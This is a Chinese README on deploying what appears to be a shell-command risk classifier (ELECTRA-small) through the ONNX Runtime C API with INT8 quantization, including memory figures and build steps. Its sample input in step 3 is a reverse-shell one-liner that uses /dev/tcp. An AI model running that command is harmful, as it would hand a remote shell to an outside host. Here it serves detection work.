# 部署 / RSS 优化（C 运行时）

最终模型（electra-small，13.75M）在 Python/PyTorch 下 RSS 约 300~500MB，
大头是 PyTorch 运行时固定开销。换成 **ONNX Runtime C API + INT8** 后：

| 运行时 | 模型 | 权重大小 | **峰值 RSS** |
|---|---|---|---|
| PyTorch（现状） | fp32 | 55MB | ~300~500MB |
| ONNX Runtime C | fp32 | 56.5MB | **93MB** |
| ONNX Runtime C | **INT8** | **15.1MB** | **77.7MB** ✅ |

## 产物

- `model/checkpoints_gpu/final_model_electra/model.onnx` — fp32 ONNX（56.5MB，含 external data）
- `model/checkpoints_gpu/final_model_electra/model_int8.onnx` — INT8 ONNX（15.1MB，单文件）
- `export/c_infer_example.c` — ONNX Runtime C API 推理示例（编译产物 `c_infer_example`）
- `export/prepare_c_input.py` — 把命令 + 标签分块 tokenize 成 C 可读的 int64 .bin
- `export/quantize_int8_onnx.py` — ONNX 动态 INT8 量化

## 使用流程

```bash
# 1) 导出 ONNX（已在本地生成，重跑：）
python -m export.export_onnx

# 2) INT8 量化
python -m export.quantize_int8_onnx

# 3) 准备输入（命令 + 前 50 个标签）
python -m export.prepare_c_input "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# 4) 编译 C 推理（onnxruntime 头文件在 export/ort_headers/，或用你本机的 onnxruntime C API 头）
gcc -O2 export/c_infer_example.c -Iexport/ort_headers -Iexport/ort_headers/onnxruntime \
    -o export/c_infer_example <onnxruntime>/capi/libonnxruntime.so.1.30.0

# 5) 运行（int8，RSS ~78MB）
LD_LIBRARY_PATH=<onnxruntime>/capi ./export/c_infer_example \
    model/checkpoints_gpu/final_model_electra/model_int8.onnx \
    export/input_ids.bin export/attention_mask.bin
```

## 推理约定（分块）

模型 `max_num_classes=50`，每次前向最多给 50 个标签打分。199 个标签分 4 块
（50/50/50/49），每块拼成 `<<LABEL>>label...<<SEP>>command`，输出 50 维 logits，
前 k 个对应本块的 k 个标签。risk 用 argmax（互斥），intent/tactic/technique 用
`configs/thresholds.json` 的分组阈值。

## 说明

- C 侧只跑模型前向；tokenizer 在部署侧可以用 Python/预计算，或后续接一个 C 版 tokenizer。
- 若要进一步压到 ~35MB：对 Gather（词表 embedding）做静态量化、去掉 onnxruntime 的
  session 选项池、或自研极简前向。
